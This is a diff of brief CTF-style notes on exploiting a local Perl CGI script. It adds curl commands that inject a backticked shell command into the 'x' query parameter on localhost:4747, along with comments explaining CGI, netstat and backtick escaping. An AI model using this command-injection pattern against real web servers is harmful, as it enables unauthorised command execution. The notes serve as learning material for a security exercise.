@@ -1,2 +1,15 @@
-netstat -tulpn
+# CGI exploit
+netstat -tl
 curl localhost:4747?x=\`getflag\`
+curl 'localhost:4747?x=`getflag`'
+
+# CGI - Common Gateway Interface - the way of interaction between browser and web-server
+# CGI script - any program (in our case perl) which provide this interaction
+
+# netstat - shows all ports what are listened 
+# - t - TCP connections
+# - l - ports actively listened
+
+# find port (listeend and inside the script) -> put getflag instead x into server
+# \ - for ecraning
+# ´´ - the backtick allows you to assign the output of a shell command to a variable
